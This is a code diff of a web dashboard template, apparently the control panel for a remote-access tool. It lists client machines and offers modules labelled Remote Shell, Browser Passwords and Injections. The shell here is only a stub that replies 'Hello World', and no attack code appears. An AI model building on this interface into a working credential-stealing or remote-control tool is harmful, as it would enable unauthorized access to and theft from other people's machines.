@@ -1,3 +1,4 @@
+{% load static %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -31,11 +32,22 @@
 
     /* Modules buttons styling, as you had before */
     .dropdown.modules button {
-      color: black;
+      padding: 6px 14px;
       background-color: var(--accent-color);
-      font-weight: normal;
-      transition: all 0.3s ease;
+      color: #000;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      font-size: 0.85rem;
+      border: none;
+      transition: background-color 0.3s;
+      align-self: center;
+      height: 35px;
     }
+    
+    .dropdown.modules button:hover {
+      background-color: #006fa1;
+    }
+
     .dropdown.modules button.active {
       color: white;
       background-color: #006fa1;
@@ -44,7 +56,7 @@
 
     /* The active-client-tab container */
     .active-client-tab {
-      position: relative; /* So we can position chat panel absolutely */
+      position: relative;
       display: none;
       padding: 20px;
       background: rgba(255, 255, 255, 0.05);
@@ -60,14 +72,10 @@
     .chat-slide-panel {
       display: flex;
       flex-direction: column;
-      background: #252525;
       border-radius: var(--border-radius);
-      box-shadow: -2px 0 5px rgba(0, 0, 0, 0.5);
       margin-top: 1rem;
-      overflow: hidden; /* Keep content contained */
-    }
-    .chat-slide-panel.open {
-      right: 0;
+      overflow: hidden;
+      height: 30rem; /* just a fixed height for demonstration */
     }
     .chat-slide-header {
       padding: 0.75rem 1rem;
@@ -77,27 +85,29 @@
       border-top-right-radius: var(--border-radius);
       background:
         linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
-        url("{{ url_for('static', filename='images/chat-shell-header.jpg') }}");
+        url("{% static 'images/chat-shell-header.jpg' %}");
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
       box-shadow: inset 0 -1px 2px rgba(0, 0, 0, 0.4);
       border-bottom: 1px solid grey;
+      display: flex; 
+      justify-content: space-between;
     }
     .chat-slide-body {
-      height: 300px;
       flex: 1;
       padding: 0.75rem 1rem;
       overflow-y: auto;
       background:
         linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
-        url("{{ url_for('static', filename='images/chat-shell-body.jpg') }}");
+        url("{% static 'images/chat-shell-body.jpg' %}");
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
     }
     .chat-slide-footer {
       display: flex;
+      background: #252525;
       gap: 0.5rem;
       padding: 0.75rem 1rem;
       border-bottom-left-radius: var(--border-radius);
@@ -192,14 +202,19 @@
       padding: 10px 20px;
       margin-right: 10px;
       background-color: var(--accent-color);
-      color: var(--text-color);
+      color: black;
       border-radius: var(--border-radius);
       cursor: pointer;
       display: flex;
       align-items: center;
     }
+    .tab:hover{
+      background-color: #006fa1;
+    }
     .tab.active {
       background-color: #006fa1;
+      color: white;
+      font-weight: bold;
     }
     .tab-close {
       font-size: 1.2em;
@@ -237,20 +252,36 @@
       font-family: var(--font-heading);
     }
     .client-card .client-icon {
-      width: 50px; height: 50px;
+      width: 50px; 
+      height: 50px;
       border-radius: var(--border-radius);
       margin: 0 auto 0px auto;
-      display: flex; justify-content: center; align-items: center;
-      color: #000; font-size: 1.2em;
+      display: flex; 
+      justify-content: center; 
+      align-items: center;
+      color: #000; 
+      font-size: 1.2em;
+    }
+
+    .client-icon > img {
+      height: -webkit-fill-available;
     }
 
     /* For the OS / Memory / Disk info block in card */
     .client-info {
-      display: flex; justify-content: space-evenly; color: #ddd;
-      align-self: self-end; width: 50px; height: 50px;
-      border-radius: var(--border-radius); align-items: center;
-      font-size: 1.5em; margin: 10px auto;
-      background-size: contain; background-repeat: no-repeat; background-position: center;
+      display: flex; 
+      justify-content: space-evenly; 
+      color: #ddd;
+      align-self: self-end; 
+      width: 50px; 
+      height: 50px;
+      border-radius: var(--border-radius); 
+      align-items: center;
+      font-size: 1.5em; 
+      margin: 10px auto;
+      background-size: contain; 
+      background-repeat: no-repeat; 
+      background-position: center;
     }
     .client-info div {
       text-align: center;
@@ -258,9 +289,14 @@
     .activate-btn {
       padding: 6px 14px;
       background-color: var(--accent-color);
-      color: #000; border-radius: var(--border-radius);
-      cursor: pointer; font-size: 0.85rem; border: none;
-      transition: background-color 0.3s; align-self: center; height: 42px;
+      color: #000; 
+      border-radius: var(--border-radius);
+      cursor: pointer; 
+      font-size: 0.85rem; 
+      border: none;
+      transition: background-color 0.3s; 
+      align-self: center; 
+      height: 42px;
     }
     .activate-btn:hover {
       background-color: #006fa1;
@@ -296,17 +332,15 @@
 
   <!-- Scrollable container for client cards -->
   <div class="scrollable-container">
-    <!-- Example Client Cards (Using partial JSON info: OS, Memory, Disk, etc.) -->
-    
     <!-- 1) Machine 1 -->
     <div class="row client-card" data-client-name="Machine1">
       <div class="col-2 p-0 m-0">
         <h4>Machine 1</h4>
         <div class="client-icon">
-          <img src="{{ url_for('static', filename='images/windows.svg') }}" alt="Windows Icon">
+          <img src="{% static 'images/windows.svg' %}" alt="Windows Icon">
         </div>
       </div>
-      <div class="col client-info" style="flex-direction: column;">
+      <div class="col client-info">
         <div>
           <strong>OS:</strong>
           <p id="os-Machine1"></p>
@@ -328,10 +362,10 @@
       <div class="col-2 p-0 m-0">
         <h4>Machine 2</h4>
         <div class="client-icon">
-          <img src="{{ url_for('static', filename='images/linux.png') }}" alt="Linux Icon">
+          <img src="{% static 'images/linux.png' %}" alt="Linux Icon">
         </div>
       </div>
-      <div class="col client-info" style="flex-direction: column;">
+      <div class="col client-info">
         <div>
           <strong>OS:</strong>
           <p id="os-Machine2"></p>
@@ -353,10 +387,10 @@
       <div class="col-2 p-0 m-0">
         <h4>Machine 3</h4>
         <div class="client-icon">
-          <img src="{{ url_for('static', filename='images/apple.png') }}" alt="Mac Icon">
+          <img src="{% static 'images/apple.png' %}" alt="Mac Icon">
         </div>
       </div>
-      <div class="col client-info" style="flex-direction: column;">
+      <div class="col client-info">
         <div>
           <strong>OS:</strong>
           <p id="os-Machine3"></p>
@@ -376,10 +410,17 @@
 </main>
 
 <script>
-  /* 
-    1) We store JSON for multiple machines: partial for card display, full for detail panel 
-       (You can expand these as needed.)
+  /*
+    GLOBAL chatHistory object:
+    - For each clientName, we store an array of messages.
+    - Each message is { role: 'user' | 'bot', text: '...' }
+    Example: chatHistory['Machine1'] = [
+      { role: 'user', text: 'dir' },
+      { role: 'bot',  text: 'C:\\stuff...' }
+    ];
   */
+  let chatHistory = {};
+
   const clientJSON = {
     "Machine1": {
       "PartialInfo": {
@@ -437,7 +478,20 @@
     }
   };
 
-  /* 2) On page load, fill the partial info for each card from JSON */
+  const MODULES_BUTTONS = {
+    "options": {
+      "RemoteShell": {
+        "class": "remoteShellButton",
+        "onclick": showRemoteShell
+      },
+      "MachineInfo": {
+        "class": "machineInfoButton",
+        "onclick": showMachineInfo
+      }
+    }
+  };
+
+  /* 1) On page load, fill partial info for each card */
   window.addEventListener("DOMContentLoaded", () => {
     Object.keys(clientJSON).forEach((key) => {
       const partial = clientJSON[key].PartialInfo;
@@ -451,12 +505,11 @@
     });
   });
 
-  /* 3) Activate client => create tab + detail panel from JSON FullDetails */
+  /* 2) Activate client => create tab + detail panel from JSON */
   function activateClient(clientName) {
     const existingTab = document.querySelector(`.tab[data-tab="${clientName}"]`);
-    if (existingTab) { 
-      // Tab already exists, optionally open it
-      // openTab(clientName);
+    if (existingTab) {
+      // Already have a tab
       return;
     }
 
@@ -481,21 +534,56 @@
 
     // Build the detail panel from JSON
     createClientDetails(clientName);
-    // Optionally: openTab(clientName);
+    // Optionally, openTab(clientName);
   }
 
-  /* 4) Build detail panel for the client from JSON FullDetails */
+  /* 3) Build detail panel for the client */
   function createClientDetails(clientName) {
     const contentContainer = document.getElementById('client-tab-content');
     const detailDiv = document.createElement('div');
     detailDiv.classList.add('active-client-tab');
     detailDiv.setAttribute('data-client', clientName);
 
+    detailDiv.innerHTML = `
+      <div class="navbar">
+        <h3 class="optionHeader" id="optionHeader-${clientName}"></h3>
+        <div class="dropdown modules">
+          <button class="remoteShellButton" onclick="switchViewBasedOnModule('${clientName}', 'remoteShellButton')">Remote Shell</button>
+          <button class="machineInfoButton active" onclick="switchViewBasedOnModule('${clientName}', 'machineInfoButton')">Machine Info</button>
+          <button class="browserPassButton">Browser Passwowrds</button>
+          <button class="injectionsButton">Injections</button>
+          <button class="processesButton">Processes</button>
+        </div>
+      </div>
+      <div class="row" id="clientModulesRow-${clientName}">
+      </div>
+    `;
+    contentContainer.appendChild(detailDiv);
+
+    showMachineInfo(clientName);
+    toggleActiveModules(clientName);
+  }
+
+  /* For switching modules via your table: RemoteShell / MachineInfo */
+  function switchViewBasedOnModule(clientName, className) {
+    const MODULES_BUTTONS_OPTIONS = MODULES_BUTTONS.options;
+    for (const option in MODULES_BUTTONS_OPTIONS) {
+      const button = MODULES_BUTTONS_OPTIONS[option];
+      if (button.class == className) {
+        button.onclick(clientName);
+      }
+    }
+  }
+
+  function showMachineInfo(clientName) {
+    const clientRow = document.getElementById(`clientModulesRow-${clientName}`);
+    const moduleOptionHeader = document.getElementById(`optionHeader-${clientName}`);
+
+    moduleOptionHeader.textContent = `${clientName} Details`;
+
     const details = clientJSON[clientName].FullDetails;
     if (!details) return;
 
-    // Prepare an HTML snippet for the full JSON
-    // You can refine or format this as needed to display everything
     const fullJSON = `
       <p><strong>Hostname:</strong> ${details.Hostname}</p>
       <p><strong>Operating System:</strong> ${details.OSVersion}</p>
@@ -507,66 +595,119 @@
       <p><strong>GPU:</strong> ${details.GPU}</p>
       <p><strong>Last Login:</strong> ${details.LastLogin}</p>
     `;
-
-    detailDiv.innerHTML = `
-      <div class="navbar">
-        <h3>${clientName} Details</h3>
-        <div class="dropdown modules">
-          <button onclick="toggleChat('${clientName}')">Remote Shell</button>
-          <button>Machine Info</button>
-          <button>Browser Passwowrds</button>
-          <button>Injections</button>
-          <button>Processes</button>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col">
-          <!-- FULL JSON details -->
-          ${fullJSON}
-        </div>
-        <div class="col">
-          <!-- The chat panel -->
-          <div class="chat-slide-panel" id="chatPanel-${clientName}" style="display: none;">
-            <div class="chat-slide-header">
-              <strong>${clientName} - Remote Shell</strong>
-            </div>
-            <div class="chat-slide-body" id="chatBody-${clientName}"></div>
-            <div class="chat-slide-footer">
-              <input
-                type="text"
-                class="chat-input"
-                placeholder="Type a command..."
-                id="chatInput-${clientName}"
-              />
-              <button
-                class="chat-send-btn"
-                onclick="sendCommand('${clientName}')"
-              >
-                Send
-              </button>
-            </div>
-          </div>
-        </div>
-      </div>
-    `;
-    contentContainer.appendChild(detailDiv);
+    clientRow.innerHTML = fullJSON;
   }
 
-  /* 5) Show All Clients => revert to original card view */
+  /* -------------- In-memory Chat -------------- */
+
+  // Re-renders all messages for the specified clientName
+  function renderChatHistory(clientName) {
+    const chatBody = document.getElementById(`chatBody-${clientName}`);
+    if (!chatBody) return;
+
+    // Clear old messages from DOM
+    chatBody.innerHTML = '';
+
+    // If no history yet, do nothing
+    if (!chatHistory[clientName]) return;
+
+    // Loop over stored messages and create rows
+    chatHistory[clientName].forEach(msg => {
+      const msgDiv = document.createElement('div');
+      msgDiv.classList.add('message-row');
+      if (msg.role === 'user') {
+        msgDiv.classList.add('right');
+      } else {
+        msgDiv.classList.add('left');
+      }
+      msgDiv.innerHTML = `<div class="message-bubble">${msg.text}</div>`;
+      chatBody.appendChild(msgDiv);
+    });
+
+    // Scroll to bottom
+    chatBody.scrollTop = chatBody.scrollHeight;
+  }
+
+  function showRemoteShell(clientName) {
+    const clientRow = document.getElementById(`clientModulesRow-${clientName}`);
+    const moduleOptionHeader = document.getElementById(`optionHeader-${clientName}`);
+
+    moduleOptionHeader.textContent = `${clientName} Remote Shell`;
+
+    // Rebuild the shell panel, but we won't lose messages since they're in chatHistory
+    clientRow.innerHTML = `
+      <div class="chat-slide-panel" id="chatPanel-${clientName}">
+        <div class="chat-slide-header">
+          <strong>${clientName} - Remote Shell</strong>
+        </div>
+        <div class="chat-slide-body" id="chatBody-${clientName}"></div>
+        <div class="chat-slide-footer">
+          <input
+            type="text"
+            class="chat-input"
+            placeholder="Type a command..."
+            id="chatInput-${clientName}"
+          />
+          <button
+            class="chat-send-btn"
+            onclick="sendCommand('${clientName}')"
+          >
+            Send
+          </button>
+        </div>
+      </div>`;
+
+    // If we don't have a history array yet, create it
+    if (!chatHistory[clientName]) {
+      chatHistory[clientName] = [];
+    }
+
+    // Now re-render existing messages (if any)
+    renderChatHistory(clientName);
+  }
+
+  /* Called when user hits "Send" in the chat */
+  function sendCommand(clientName) {
+    const input = document.getElementById(`chatInput-${clientName}`);
+    if (!input) return;
+
+    const userCmd = input.value.trim();
+    if (!userCmd) return;
+
+    // 1) Push the user's command
+    if (!chatHistory[clientName]) {
+      chatHistory[clientName] = [];
+    }
+    chatHistory[clientName].push({ role: 'user', text: userCmd });
+
+    // 2) Simulate a response
+    chatHistory[clientName].push({ role: 'bot', text: 'Hello World' });
+
+    // 3) Re-render chat
+    renderChatHistory(clientName);
+
+    // 4) Clear input
+    input.value = '';
+  }
+
+  /* -------------- End In-memory Chat -------------- */
+
+
+  /* Show All Clients => revert to original card view */
   function showAllClients() {
     document.querySelectorAll('.tab').forEach((tab) => tab.classList.remove('active'));
     document.querySelectorAll('.active-client-tab').forEach((p) => p.classList.remove('active'));
     const allClientsTab = document.querySelector('.tab[data-tab="all-clients"]');
     if (allClientsTab) allClientsTab.classList.add('active');
 
-    // Show all client cards again
+    // Show all client cards
     document.querySelectorAll('.client-card').forEach((card) => {
       card.style.display = 'flex';
       card.style.border = '';
     });
   }
 
-  /* 6) Open a specific client tab => hide cards, show detail */
+  /* Open a specific client tab => hide cards, show detail */
   function openTab(clientName) {
     document.querySelectorAll('.client-card').forEach((c) => (c.style.display = 'none'));
     document.querySelectorAll('.tab').forEach((t) => t.classList.remove('active'));
@@ -579,7 +720,7 @@
     if (selectedPanel) selectedPanel.classList.add('active');
   }
 
-  /* 7) Close the tab */
+  /* Close the tab */
   function closeTab(clientName) {
     const tabToRemove = document.querySelector(`.tab[data-tab="${clientName}"]`);
     if (tabToRemove) tabToRemove.remove();
@@ -590,7 +731,19 @@
     showAllClients();
   }
 
-  /* 8) Flip in/out the chat container */
+  function toggleActiveModules(clientName) {
+    const detailDiv = document.querySelector(`[data-client="${clientName}"]`);
+    const modulesDiv = detailDiv.querySelectorAll(".dropdown.modules button");
+
+    modulesDiv.forEach(button => {
+      button.addEventListener("click", () => {
+        modulesDiv.forEach(btn => btn.classList.remove("active"));
+        button.classList.add("active");
+      });
+    });
+  }
+
+  /* Optional toggleChat animation logic (unused in this approach) */
   function toggleChat(clientName) {
     const chatPanel = document.getElementById(`chatPanel-${clientName}`);
     if (!chatPanel) return;
@@ -608,30 +761,6 @@
         chatPanel.removeEventListener('animationend', handleFlipOut);
       });
     }
-  }
-
-  /* 9) Send command => user msg (right), 'Hello World' (left) */
-  function sendCommand(clientName) {
-    const input = document.getElementById(`chatInput-${clientName}`);
-    const chatBody = document.getElementById(`chatBody-${clientName}`);
-    if (!input || !chatBody) return;
-
-    const userCmd = input.value.trim();
-    if (!userCmd) return;
-
-    const userDiv = document.createElement('div');
-    userDiv.classList.add('message-row','right');
-    userDiv.innerHTML = `<div class="message-bubble">${userCmd}</div>`;
-    chatBody.appendChild(userDiv);
-
-    input.value = '';
-
-    const respDiv = document.createElement('div');
-    respDiv.classList.add('message-row','left');
-    respDiv.innerHTML = `<div class="message-bubble">Hello World</div>`;
-    chatBody.appendChild(respDiv);
-
-    chatBody.scrollTop = chatBody.scrollHeight;
   }
 </script>
 </body>
